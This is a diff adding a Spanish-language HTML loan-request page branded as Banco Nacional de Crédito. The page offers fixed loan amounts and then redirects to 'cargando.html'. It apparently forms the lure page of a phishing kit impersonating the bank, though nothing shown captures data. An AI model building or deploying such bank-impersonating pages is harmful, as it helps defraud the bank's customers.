@@ -1,0 +1,170 @@
+<html lang="es"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Solicitar Préstamo - BNC</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&amp;display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: Poppins, Helvetica, Arial, sans-serif;
+            background: url('https://www.example.com/your-background-image.jpg') no-repeat center center fixed; /* Cambia a la URL de tu imagen de fondo */
+            background-size: cover;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 0;
+            margin: 0;
+        }
+
+        .container {
+            background-color: rgba(0, 28, 77, 0.9); /* Fondo semitransparente */
+            width: 100%;
+            max-width: 480px;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.4);
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .container img {
+            width: 100px;
+            margin-bottom: 20px;
+            border-radius: 50%; /* Borde redondeado */
+            border: 3px solid #fff; /* Borde blanco */
+        }
+
+        .container h2 {
+            font-size: 24px;
+            margin-bottom: 10px;
+            color: #fff;
+        }
+
+        .container p {
+            font-size: 14px;
+            margin-bottom: 20px;
+            color: #fff;
+        }
+
+        .loan-options {
+            margin-bottom: 20px;
+            color: #fff;
+        }
+
+        .loan-option {
+            background-color: #377dff;
+            border: none;
+            color: #fff;
+            padding: 10px 15px;
+            border-radius: 5px;
+            cursor: pointer;
+            margin: 5px 0;
+            width: 100%;
+            transition: background-color 0.3s;
+            font-size: 16px;
+        }
+
+        .loan-option.selected {
+            background-color: #28a745; /* Color al seleccionar */
+        }
+
+        .loan-option:hover {
+            background-color: #003d73;
+        }
+
+        button[type="submit"] {
+            width: 100%;
+            padding: 12px;
+            background-color: #28a745;
+            color: #ffffff;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+
+        button[type="submit"]:hover {
+            background-color: #218838;
+        }
+
+        footer {
+            font-size: 12px;
+            color: #666;
+            line-height: 1.5;
+            text-align: center;
+            padding: 10px;
+            background-color: rgba(255, 255, 255, 0.8);
+            width: 100%;
+            margin-top: 20px;
+        }
+
+        footer p {
+            margin-bottom: 5px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <img src="bnnc.jpg" alt="Logo BNC"> <!-- Cambia a la URL de tu logo -->
+        <h2>Solicitar Préstamo</h2>
+        <p>Elige el monto que deseas solicitar y procede a la solicitud.</p> <!-- Texto adicional -->
+        <div class="loan-options">
+            <button class="loan-option" onclick="selectLoanOption('Bs 10,000', this)" style="
+    font-family: Poppins, Helvetica, Arial, sans-serif;
+">Monto: Bs 10,000</button>
+            <button class="loan-option" onclick="selectLoanOption('Bs 15,000', this)" style="
+    font-family: Poppins, Helvetica, Arial, sans-serif;
+">Monto: Bs 15,000</button>
+            <button class="loan-option" onclick="selectLoanOption('Bs 20,000', this)" style="
+    font-family: Poppins, Helvetica, Arial, sans-serif;
+">Monto: Bs 20,000</button>
+            <button class="loan-option" onclick="selectLoanOption('Bs 40,000', this)" style="
+    font-family: Poppins, Helvetica, Arial, sans-serif;
+">Monto: Bs 40,000</button>
+        </div>
+        <button type="submit" onclick="proceedToApplication()" style="
+    font-family: Poppins, Helvetica, Arial, sans-serif;
+">Continuar</button>
+    </div>
+
+    <footer>
+        <p>Banco Nacional de Crédito, Banco Universal.<br>Rif: J-30984132-7 © 2024 | BNC Versión: 1.18</p>
+        <p>Todos los derechos reservados.</p>
+    </footer>
+
+    <script>
+        let selectedLoanAmount = '';
+    
+        function selectLoanOption(amount, button) {
+            selectedLoanAmount = amount; // Guardar la opción seleccionada
+    
+            // Remover clase 'selected' de todos los botones
+            const options = document.querySelectorAll('.loan-option');
+            options.forEach(option => option.classList.remove('selected'));
+    
+            // Agregar clase 'selected' al botón clickeado
+            button.classList.add('selected');
+    
+            alert("Has seleccionado el monto: " + amount);
+        }
+    
+        function proceedToApplication() {
+            if (selectedLoanAmount === '') {
+                alert("Por favor, selecciona un monto antes de proceder.");
+            } else {
+                window.location.href = "cargando.html"; // Redirección a la página de solicitud
+            }
+        }
+    </script>
+    
+
+
+
+</body></html>
